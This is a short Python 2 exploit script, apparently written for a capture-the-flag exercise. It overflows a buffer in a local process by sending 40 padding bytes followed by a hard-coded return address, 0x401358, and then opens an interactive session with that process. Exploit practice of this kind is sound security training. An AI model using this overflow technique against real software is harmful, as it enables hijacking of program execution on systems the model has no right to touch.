import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()

print p.readuntil('data:') # 0x40 13 58
p.sendline("A"*40 + "\x58\x13\x40\x00\x00\x00") 
print p.readuntil('-')

# data = p.readuntil('\n')
# p.sendline('hello')

p.interactive()
